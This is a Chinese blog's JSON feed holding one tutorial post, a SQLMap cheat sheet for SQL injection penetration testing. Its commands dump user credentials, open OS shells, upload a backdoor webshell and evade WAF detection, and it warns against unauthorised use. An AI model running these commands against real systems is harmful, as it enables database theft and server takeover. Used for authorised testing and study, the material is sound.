{
    "version": "https://jsonfeed.org/version/1",
    "title": "bae的博客 • All posts by \"工具\" tag",
    "description": "bae的个人博客",
    "home_page_url": "https://bae-ace.github.io",
    "items": [
        {
            "id": "https://bae-ace.github.io/2025/07/21/SQLMap-%E8%87%AA%E5%8A%A8%E5%8C%96-SQL-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/",
            "url": "https://bae-ace.github.io/2025/07/21/SQLMap-%E8%87%AA%E5%8A%A8%E5%8C%96-SQL-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/",
            "title": "SQLMap 自动化 SQL 注入工具",
            "date_published": "2025-07-21T11:33:02.000Z",
            "content_html": "<h2 id=\"SQLMap-自动化-SQL-注入工具\"><a href=\"#SQLMap-自动化-SQL-注入工具\" class=\"headerlink\" title=\"SQLMap 自动化 SQL 注入工具\"></a>SQLMap 自动化 SQL 注入工具</h2><h2 id=\"一、🔍-核心功能与命令选项\"><a href=\"#一、🔍-核心功能与命令选项\" class=\"headerlink\" title=\"一、🔍 核心功能与命令选项\"></a>一、🔍 核心功能与命令选项</h2><h3 id=\"（一）基础检测类-🧪\"><a href=\"#（一）基础检测类-🧪\" class=\"headerlink\" title=\"（一）基础检测类 🧪\"></a>（一）基础检测类 🧪</h3><table>\n<thead>\n<tr>\n<th>任务分类</th>\n<th>命令选项</th>\n<th>说明</th>\n<th>示例命令</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>检测注入点</td>\n<td><code>-u &lt;url&gt;</code></td>\n<td>指定目标 URL</td>\n<td><code>sqlmap -u &quot;http://x.com/index.php?id=1&quot; --batch</code></td>\n</tr>\n<tr>\n<td>POST 请求注入</td>\n<td><code>--data</code></td>\n<td>提交 POST 数据</td>\n<td><code>sqlmap -u &quot;http://x.com/login.php&quot; --data=&quot;user=admin&amp;pass=123&quot;</code></td>\n</tr>\n<tr>\n<td>Cookie 注入</td>\n<td><code>--cookie</code></td>\n<td>携带 Cookie 信息</td>\n<td><code>sqlmap -u &quot;http://x.com&quot; --cookie=&quot;PHPSESSID=123&quot;</code></td>\n</tr>\n<tr>\n<td>强制 dbms</td>\n<td><code>--dbms=&lt;类型&gt;</code></td>\n<td>强制指定数据库类型</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --dbms=mysql</code></td>\n</tr>\n<tr>\n<td>绕过 WAF</td>\n<td><code>--tamper=&lt;脚本&gt;</code></td>\n<td>使用 Tamper 脚本</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --tamper=charunicodeencode</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"（二）数据枚举类-📚\"><a href=\"#（二）数据枚举类-📚\" class=\"headerlink\" title=\"（二）数据枚举类 📚\"></a>（二）数据枚举类 📚</h3><table>\n<thead>\n<tr>\n<th>任务分类</th>\n<th>命令选项</th>\n<th>说明</th>\n<th>示例命令</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>枚举所有数据库</td>\n<td><code>--dbs</code></td>\n<td>列出目标所有数据库</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --dbs</code></td>\n</tr>\n<tr>\n<td>枚举指定数据库表</td>\n<td><code>-D &lt;db&gt; --tables</code></td>\n<td>列出指定数据库的表</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; -D mydb --tables</code></td>\n</tr>\n<tr>\n<td>枚举字段</td>\n<td><code>-D &lt;db&gt; -T &lt;table&gt; --columns</code></td>\n<td>列出表字段</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; -D mydb -T users --columns</code></td>\n</tr>\n<tr>\n<td>导出字段数据</td>\n<td><code>-D &lt;db&gt; -T &lt;table&gt; -C &lt;cols&gt; --dump</code></td>\n<td>指定字段并导出</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; -D mydb -T users -C username,password --dump</code></td>\n</tr>\n<tr>\n<td>获取数据库用户</td>\n<td><code>--users</code></td>\n<td>获取数据库用户信息</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --users</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"（三）高级操作类-🛠️\"><a href=\"#（三）高级操作类-🛠️\" class=\"headerlink\" title=\"（三）高级操作类 🛠️\"></a>（三）高级操作类 🛠️</h3><table>\n<thead>\n<tr>\n<th>任务分类</th>\n<th>命令选项</th>\n<th>说明</th>\n<th>示例命令</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>获取系统 Shell</td>\n<td><code>--os-shell</code></td>\n<td>打开 OS Shell（高权限需）</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --os-shell</code></td>\n</tr>\n<tr>\n<td>上传文件</td>\n<td><code>--file-write/--file-dest</code></td>\n<td>上传文件到目标服务器</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php</code></td>\n</tr>\n<tr>\n<td>权限提升</td>\n<td><code>--priv-esc</code></td>\n<td>数据库用户权限提升尝试</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --priv-esc</code></td>\n</tr>\n<tr>\n<td>执行系统命令</td>\n<td><code>--os-cmd=&quot;&lt;命令&gt;&quot;</code></td>\n<td>执行系统命令</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --os-cmd=&quot;whoami&quot;</code></td>\n</tr>\n</tbody></table>\n<h2 id=\"二、🎯-实用场景命令示例\"><a href=\"#二、🎯-实用场景命令示例\" class=\"headerlink\" title=\"二、🎯 实用场景命令示例\"></a>二、🎯 实用场景命令示例</h2><h3 id=\"✅-基础注入检测\"><a href=\"#✅-基础注入检测\" class=\"headerlink\" title=\"✅ 基础注入检测\"></a>✅ 基础注入检测</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 基本 GET 请求注入</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://testphp.vulnweb.com/artists.php?artist=1&quot;</span> --batch<br><br><span class=\"hljs-comment\"># POST 表单注入（如登录）</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/login.php&quot;</span> --data=<span class=\"hljs-string\">&quot;username=admin&amp;password=admin&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"📚-数据枚举与导出\"><a href=\"#📚-数据枚举与导出\" class=\"headerlink\" title=\"📚 数据枚举与导出\"></a>📚 数据枚举与导出</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><br><span class=\"hljs-comment\"># 枚举数据库</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> --dbs<br><br><span class=\"hljs-comment\"># 枚举指定数据库表</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> -D testdb --tables<br><br><span class=\"hljs-comment\"># 枚举表字段</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> -D testdb -T <span class=\"hljs-built_in\">users</span> --columns<br><br><span class=\"hljs-comment\"># 导出字段数据</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> -D testdb -T <span class=\"hljs-built_in\">users</span> -C username,password --dump<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"🧨-高级渗透操作\"><a href=\"#🧨-高级渗透操作\" class=\"headerlink\" title=\"🧨 高级渗透操作\"></a>🧨 高级渗透操作</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 获取 OS Shell</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> --os-shell<br><br><span class=\"hljs-comment\"># 上传 WebShell</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php<br></code></pre></td></tr></table></figure>\n\n\n<h2 id=\"三、🎛️-关键参数与使用技巧\"><a href=\"#三、🎛️-关键参数与使用技巧\" class=\"headerlink\" title=\"三、🎛️ 关键参数与使用技巧\"></a>三、🎛️ 关键参数与使用技巧</h2><h3 id=\"📏-检测控制\"><a href=\"#📏-检测控制\" class=\"headerlink\" title=\"📏 检测控制\"></a>📏 检测控制</h3><table>\n<thead>\n<tr>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>--level=1~5</code></td>\n<td>设置检测深度（默认 1），高等级检测更多参数</td>\n</tr>\n<tr>\n<td><code>--risk=1~3</code></td>\n<td>设置风险等级（默认 1），高等级尝试更危险 payload</td>\n</tr>\n<tr>\n<td><code>--random-agent</code></td>\n<td>使用随机 UA，减少被识别为工具概率</td>\n</tr>\n</tbody></table>\n<h3 id=\"🧰-调试与代理支持\"><a href=\"#🧰-调试与代理支持\" class=\"headerlink\" title=\"🧰 调试与代理支持\"></a>🧰 调试与代理支持</h3><table>\n<thead>\n<tr>\n<th>参数</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>--proxy=&quot;http://127.0.0.1:8080&quot;</code></td>\n<td>配合 Burp 抓包调试</td>\n</tr>\n<tr>\n<td><code>-v 0~6</code></td>\n<td>日志输出详细程度（如 <code>-v 3</code> 显示 payload）</td>\n</tr>\n<tr>\n<td><code>--flush-session</code></td>\n<td>清除缓存，重新检测</td>\n</tr>\n</tbody></table>\n<h3 id=\"🕳️-绕过防护技巧\"><a href=\"#🕳️-绕过防护技巧\" class=\"headerlink\" title=\"🕳️ 绕过防护技巧\"></a>🕳️ 绕过防护技巧</h3><table>\n<thead>\n<tr>\n<th>脚本名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>apostrophemask</code></td>\n<td>编码单引号绕过</td>\n</tr>\n<tr>\n<td><code>base64encode</code></td>\n<td>对 Payload Base64 编码绕过</td>\n</tr>\n<tr>\n<td><code>space2comment</code></td>\n<td>使用注释代替空格（如：<code>SELECT/**/1</code>）</td>\n</tr>\n</tbody></table>\n<p>示例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">sqlmap -u <span class=\"hljs-string\">&quot;...?id=1&quot;</span> --tamper=base64encode<br><span class=\"hljs-comment\"># 多脚本组合</span><br>sqlmap -u <span class=\"hljs-string\">&quot;...?id=1&quot;</span> --tamper=between,charunicodeencode<br></code></pre></td></tr></table></figure>\n\n\n<h2 id=\"四、📌-常用命令速查表\"><a href=\"#四、📌-常用命令速查表\" class=\"headerlink\" title=\"四、📌 常用命令速查表\"></a>四、📌 常用命令速查表</h2><table>\n<thead>\n<tr>\n<th>功能</th>\n<th>示例命令</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>基础检测</td>\n<td><code>sqlmap -u &quot;http://x.com/?id=1&quot;</code></td>\n</tr>\n<tr>\n<td>POST 注入</td>\n<td><code>sqlmap -u &quot;http://x.com/login.php&quot; --data=&quot;user=admin&amp;pass=123&quot;</code></td>\n</tr>\n<tr>\n<td>枚举数据库</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --dbs</code></td>\n</tr>\n<tr>\n<td>枚举表与字段</td>\n<td><code>-D mydb --tables</code>、<code>-T users --columns</code></td>\n</tr>\n<tr>\n<td>导出数据</td>\n<td><code>-D db -T table -C col1,col2 --dump</code></td>\n</tr>\n<tr>\n<td>获取系统 Shell</td>\n<td><code>--os-shell</code></td>\n</tr>\n<tr>\n<td>绕过 WAF</td>\n<td><code>--tamper=base64encode</code></td>\n</tr>\n</tbody></table>\n<p>✅ <strong>总结与建议</strong></p>\n<ul>\n<li>🔐 切勿在未授权目标上使用 SQLMap！</li>\n<li>🔄 推荐使用 <code>--batch</code> 避免交互中断，适合脚本化执行。</li>\n<li>🧪 利用 <code>-r</code> 加载 Burp 捕获的请求文件，更真实模拟攻击场景。</li>\n<li>📌 常用指令可整理成脚本，提升实战效率。</li>\n</ul>\n",
            "tags": [
                "渗透测试",
                "工具",
                "sqlmap"
            ]
        }
    ]
}